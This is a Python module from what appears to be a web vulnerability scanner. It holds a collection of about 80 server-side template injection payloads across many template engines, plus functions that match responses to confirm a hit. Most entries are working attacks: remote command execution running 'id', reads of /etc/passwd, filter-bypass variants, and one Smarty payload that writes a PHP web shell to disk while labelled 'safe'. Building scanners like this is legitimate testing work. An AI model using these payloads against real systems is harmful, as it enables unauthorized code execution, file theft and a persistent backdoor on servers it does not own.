"""
scanner/payloads/ssti.py

Server-Side Template Injection (SSTI) payloads for vulnerability testing.
Covers: Jinja2, Twig, FreeMarker, ERB, Pebble, Velocity, Smarty, Thymeleaf,
Handlebars/Mustache, and polyglot/filter bypass variations.

Total: 50+ payloads for comprehensive SSTI detection.
"""

from .base import Payload


def ssti_math_confirm(response_text: str) -> bool:
    """
    Check for SSTI by looking for evaluated math expressions.
    Most payloads use 7*7=49 or similar.
    """
    math_results = [
        "49",          # 7*7
        "7777777",     # 7*'7' (string multiplication)
        "16",          # 4*4 (alternative)
        "25",          # 5*5 (alternative)
        "343",         # 7**3 (power)
        "36",          # 6*6
        "81",          # 9*9
        "12345678987654321",  # 111111111*111111111
    ]
    return any(result in response_text for result in math_results)


def ssti_error_confirm(response_text: str) -> bool:
    """
    Check for SSTI-related errors in response.
    """
    indicators = [
        # Jinja2/Flask
        "jinja2",
        "jinja2.exceptions",
        "undefinederror",
        "templatenotfound",
        "templatesyntaxerror",

        # Twig (PHP)
        "twig_error",
        "twig\\error",
        "twig_source",

        # FreeMarker (Java)
        "freemarker",
        "freemarker.core",
        "fmparser",
        "invalidreferenceexception",

        # Velocity (Java)
        "velocity",
        "velocityexception",
        "resourcenotfoundexception",

        # ERB (Ruby)
        "erb",
        "erubis",
        "syntaxerror",

        # Pebble (Java)
        "pebble",
        "pebbleexception",

        # Smarty (PHP)
        "smarty",
        "smartycompilerexception",
        "smarty_internal",

        # Mako (Python)
        "mako",
        "makoexception",

        # Handlebars (JS)
        "handlebars",
        "handlebars.exception",

        # Thymeleaf (Java)
        "thymeleaf",
        "templateprocessingexception",
        "spelexpression",
        "org.thymeleaf",

        # Mustache
        "mustache",

        # Generic template errors
        "template error",
        "template syntax",
        "template rendering",
        "render error",
    ]

    text_lower = response_text.lower()
    return any(indicator in text_lower for indicator in indicators)


def ssti_rce_confirm(response_text: str) -> bool:
    """
    Check for RCE indicators (system info, user info, etc.)
    """
    indicators = [
        "uid=",           # Unix id command
        "root:",          # /etc/passwd content
        "www-data",       # Common web user
        "linux",          # uname output
        "windows",        # Windows system
        "directory of",   # Windows dir command
        "volume serial",  # Windows dir command
    ]
    text_lower = response_text.lower()
    return any(indicator in text_lower for indicator in indicators)


def ssti_confirm(response_text: str) -> bool:
    """Combined confirmation for SSTI."""
    return (
        ssti_math_confirm(response_text) or
        ssti_error_confirm(response_text) or
        ssti_rce_confirm(response_text)
    )


SSTI_PAYLOADS = [
    # ============================================
    # JINJA2 / FLASK (Python) - Basic Detection
    # ============================================
    Payload(
        vuln_type="SSTI",
        name="Jinja2 basic math",
        payload="{{7*7}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_math_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 string multiplication",
        payload="{{7*'7'}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_math_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 config access",
        payload="{{config}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 self access",
        payload="{{self}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),

    # ============================================
    # JINJA2 - Class Traversal
    # ============================================
    Payload(
        vuln_type="SSTI",
        name="Jinja2 class MRO",
        payload="{{''.__class__.__mro__}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 class bases",
        payload="{{''.__class__.__bases__}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 subclasses",
        payload="{{''.__class__.__mro__[2].__subclasses__()}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 globals access",
        payload="{{request.__class__.__mro__[2].__subclasses__()}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 lipsum globals",
        payload="{{lipsum.__globals__}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 cycler access",
        payload="{{cycler.__init__.__globals__.os}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 joiner access",
        payload="{{joiner.__init__.__globals__}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),

    # ============================================
    # JINJA2 - RCE Payloads
    # ============================================
    Payload(
        vuln_type="SSTI",
        name="Jinja2 RCE via Popen",
        payload="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 RCE via import",
        payload="{{lipsum.__globals__['os'].popen('id').read()}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 RCE namespace",
        payload="{{namespace.__init__.__globals__.os.popen('id').read()}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 RCE subprocess",
        payload="{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),

    # ============================================
    # TWIG (PHP) - Basic Detection
    # ============================================
    Payload(
        vuln_type="SSTI",
        name="Twig basic math",
        payload="{{7*7}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_math_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Twig string concat",
        payload="{{7*'7'}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_math_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Twig dump",
        payload="{{dump(app)}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),

    # ============================================
    # TWIG - PHP Functions
    # ============================================
    Payload(
        vuln_type="SSTI",
        name="Twig _self env",
        payload="{{_self.env}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Twig id function",
        payload="{{['id']|filter('system')}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Twig passthru",
        payload="{{['id']|filter('passthru')}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Twig exec",
        payload="{{['id']|filter('exec')}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Twig map filter RCE",
        payload="{{['id']|map('system')|join}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Twig reduce RCE",
        payload="{{[0]|reduce('system','id')}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Twig sort RCE",
        payload="{{['id',0]|sort('system')}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),

    # ============================================
    # FREEMARKER (Java) - Basic Detection
    # ============================================
    Payload(
        vuln_type="SSTI",
        name="FreeMarker interpolation",
        payload="${7*7}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_math_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="FreeMarker alternative",
        payload="#{7*7}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_math_confirm
    ),

    # ============================================
    # FREEMARKER - Java RCE
    # ============================================
    Payload(
        vuln_type="SSTI",
        name="FreeMarker Execute class",
        payload='${"freemarker.template.utility.Execute"?new()("id")}',
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="FreeMarker ObjectConstructor",
        payload='${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id")}',
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="FreeMarker Runtime exec",
        payload='<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="FreeMarker JndiObjectFactory",
        payload='${"freemarker.template.utility.JythonRuntime"?new()("import os;os.system(\'id\')")}',
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="FreeMarker API access",
        payload="${object?api.class.forName('java.lang.Runtime')}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),

    # ============================================
    # ERB (Ruby) - Basic Detection
    # ============================================
    Payload(
        vuln_type="SSTI",
        name="ERB basic math",
        payload="<%= 7*7 %>",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_math_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="ERB power operation",
        payload="<%= 7**2 %>",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_math_confirm
    ),

    # ============================================
    # ERB - Ruby RCE
    # ============================================
    Payload(
        vuln_type="SSTI",
        name="ERB system command",
        payload="<%= system('id') %>",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="ERB backtick exec",
        payload="<%= `id` %>",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="ERB IO popen",
        payload="<%= IO.popen('id').readlines() %>",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="ERB File read",
        payload="<%= File.read('/etc/passwd') %>",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="ERB Open read",
        payload="<%= open('|id').read %>",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),

    # ============================================
    # VELOCITY (Java)
    # ============================================
    Payload(
        vuln_type="SSTI",
        name="Velocity math",
        payload="#set($x=7*7)${x}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_math_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Velocity class inspect",
        payload='$class.inspect("java.lang.Runtime")',
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Velocity Runtime getRuntime",
        payload='#set($rt=$class.inspect("java.lang.Runtime").type.getRuntime())#set($p=$rt.exec("id"))$p.waitFor()',
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Velocity ProcessBuilder",
        payload='#set($s="")#set($pb=$class.inspect("java.lang.ProcessBuilder").type)#set($p=$pb.getConstructor($s.class.forName("java.util.List")).newInstance(["id"]))',
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Velocity toString",
        payload='#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass()).invoke(null,"id")',
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),

    # ============================================
    # SMARTY (PHP)
    # ============================================
    Payload(
        vuln_type="SSTI",
        name="Smarty math equation",
        payload="{math equation='7*7'}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_math_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Smarty php tag",
        payload="{php}echo 7*7;{/php}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_math_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Smarty literal php",
        payload="{literal}<script language=\"php\">echo 7*7;</script>{/literal}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_math_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Smarty if system",
        payload="{if system('id')}{/if}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Smarty self system",
        payload="{self::system('id')}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Smarty Smarty_Internal_Write_File",
        payload="{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[c]); ?>',self::clearConfig())}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),

    # ============================================
    # PEBBLE (Java)
    # ============================================
    Payload(
        vuln_type="SSTI",
        name="Pebble basic math",
        payload="{{ 7*7 }}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_math_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Pebble variable access",
        payload="{{ beans }}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Pebble class forName",
        payload='{{ "".getClass().forName("java.lang.Runtime") }}',
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Pebble Runtime exec",
        payload='{% set cmd = "id" %}{{ "".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),cmd) }}',
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),

    # ============================================
    # THYMELEAF (Java)
    # ============================================
    Payload(
        vuln_type="SSTI",
        name="Thymeleaf SpEL injection",
        payload="${T(java.lang.Runtime).getRuntime().exec('id')}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Thymeleaf inline expression",
        payload="[[${7*7}]]",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_math_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Thymeleaf fragment injection",
        payload="__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Thymeleaf preprocessing",
        payload="__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__::.x",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Thymeleaf math expression",
        payload="${7*7}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_math_confirm
    ),

    # ============================================
    # HANDLEBARS / MUSTACHE (JavaScript)
    # ============================================
    Payload(
        vuln_type="SSTI",
        name="Handlebars basic",
        payload="{{7*7}}",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssti_math_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Handlebars lookup proto",
        payload="{{#with \"s\" as |string|}}\n{{#with \"e\"}}\n{{#with split as |conslist|}}\n{{this.pop}}\n{{this.push (lookup string.sub \"constructor\")}}\n{{this.pop}}\n{{/with}}\n{{/with}}\n{{/with}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Handlebars RCE prototype",
        payload="{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Mustache triple",
        payload="{{{7*7}}}",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssti_math_confirm
    ),

    # ============================================
    # MAKO (Python)
    # ============================================
    Payload(
        vuln_type="SSTI",
        name="Mako expression",
        payload="${7*7}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_math_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Mako module import",
        payload="<%\nimport os\nx=os.popen('id').read()\n%>\n${x}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Mako inline python",
        payload="${__import__('os').popen('id').read()}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_rce_confirm
    ),

    # ============================================
    # POLYGLOT DETECTION PAYLOADS
    # ============================================
    Payload(
        vuln_type="SSTI",
        name="Polyglot detection basic",
        payload="${{<%[%'\"}}%\\",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Multi-engine math test",
        payload="{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssti_math_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Polyglot error trigger",
        payload="${{<%[%'\"}}%\\{{7*7}}",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssti_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Universal SSTI probe",
        payload="{{constructor.constructor('return this')()}}",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Polyglot all engines",
        payload="{{7*7}}${7*7}#{7*7}<%= 7*7 %>{7*7}{math equation='7*7'}",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssti_math_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Expression language probe",
        payload="${7*7}#{'7'*7}<%=7*7%>{{7*7}}",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssti_math_confirm
    ),

    # ============================================
    # FILTER BYPASS VARIATIONS
    # ============================================
    Payload(
        vuln_type="SSTI",
        name="Jinja2 attr bypass",
        payload="{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 hex encode bypass",
        payload="{{''['\\x5f\\x5fclass\\x5f\\x5f']}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 concat bypass",
        payload="{{''['__cla'+'ss__']}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 format string bypass",
        payload="{{''['__%s__'%'class']}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 dict access bypass",
        payload="{{dict.__bases__}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 request cookies bypass",
        payload="{{request.cookies.__class__.__mro__}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 unicode bypass",
        payload="{{''.\\u005f\\u005fclass\\u005f\\u005f}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 join filter bypass",
        payload="{{['__cla','ss__']|join}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 reverse bypass",
        payload="{{('__ssalc__'|reverse)}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 getitem bypass",
        payload="{{().__class__.__bases__.__getitem__(0).__subclasses__()}}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Twig block bypass",
        payload="{% block content %}{{7*7}}{% endblock %}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_math_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="FreeMarker assign bypass",
        payload="<#assign x=7*7>${x}",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_math_confirm
    ),

    # ============================================
    # ADDITIONAL DETECTION PAYLOADS
    # ============================================
    Payload(
        vuln_type="SSTI",
        name="Jinja2 namespace object",
        payload="{{namespace.__init__}}",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 range function",
        payload="{{range(10)}}",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Jinja2 debug extension",
        payload="{% debug %}",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Twig constant function",
        payload="{{constant('DIRECTORY_SEPARATOR')}}",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=ssti_error_confirm
    ),
    Payload(
        vuln_type="SSTI",
        name="Velocity evaluate",
        payload="#evaluate('$class')",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=ssti_error_confirm
    ),
]
